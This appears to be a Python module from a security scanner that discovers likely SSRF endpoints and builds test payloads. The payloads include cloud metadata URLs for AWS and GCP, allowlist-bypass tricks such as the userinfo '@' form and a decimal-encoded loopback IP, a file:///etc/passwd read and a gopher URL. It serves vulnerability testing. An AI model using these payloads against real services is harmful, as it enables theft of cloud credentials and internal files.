# -*- coding: utf-8 -*-
# SSRF payload vectors and endpoint discovery helpers for fetchbane.

from typing import Dict, List, Tuple

from siddhis.fetchbane.utils import CANARY_MARKER, join_url

DEFAULT_ENDPOINTS = (
    '/preview',
    '/webhook',
    '/fetch',
    '/api/preview',
    '/api/fetch',
    '/proxy',
)

SSRF_PARAM_NAMES = ('url', 'uri', 'target', 'link', 'src', 'href', 'webhook')


def resolve_endpoints(handler: dict, api_specs: dict = None) -> List[str]:
    explicit = handler.get('ssrf_endpoint')
    if explicit:
        paths = explicit if isinstance(explicit, list) else [explicit]
        return [p if str(p).startswith('/') else f'/{p}' for p in paths]

    found = []
    seen = set()
    for path, ops in (api_specs or {}).get('paths', {}).items():
        blob = path.lower()
        if any(k in blob for k in ('preview', 'fetch', 'webhook', 'proxy', 'import', 'url')):
            if path not in seen:
                seen.add(path)
                found.append(path)
    if not found:
        found = list(DEFAULT_ENDPOINTS)
    return found


def build_vectors(canary_url: str, mode: str = 'all') -> List[Tuple[str, str, str]]:
    """
    Return list of (tag, payload_url, severity_if_hit).
    """
    mode = (mode or 'all').lower()
    vectors: List[Tuple[str, str, str]] = []

    if mode in ('all', 'loopback', 'canary'):
        vectors.extend([
            ('loopback_canary', canary_url, 'high'),
            ('loopback_localhost', canary_url.replace('127.0.0.1', 'localhost'), 'high'),
        ])

    if mode in ('all', 'metadata'):
        vectors.extend([
            ('aws_metadata', 'http://169.254.169.254/latest/meta-data/', 'high'),
            ('gcp_metadata', 'http://metadata.google.internal/computeMetadata/v1/', 'high'),
        ])

    if mode in ('all', 'bypass'):
        # allowlist bypass style payloads targeting canary
        base = canary_url
        vectors.extend([
            ('bypass_at_userinfo', base.replace('http://', 'http://example.com@'), 'high'),
            ('bypass_hash_fragment', f'{base}#@example.com', 'medium'),
            ('bypass_decimal_ip', 'http://2130706433:9999/secret', 'high'),  # 127.0.0.1
        ])

    if mode in ('all', 'scheme'):
        vectors.extend([
            ('file_scheme', 'file:///etc/passwd', 'medium'),
            ('gopher_scheme', 'gopher://127.0.0.1:9999/_', 'low'),
        ])

    if not vectors:
        vectors = build_vectors(canary_url, 'all')
    return vectors


def resolve_param(handler: dict) -> str:
    return str(handler.get('ssrf_param') or 'url')


def resolve_canary(handler: dict, base_url: str = '') -> str:
    custom = handler.get('ssrf_canary')
    if custom:
        return str(custom)
    # default: lab-local canary
    return 'http://127.0.0.1:9999/secret'
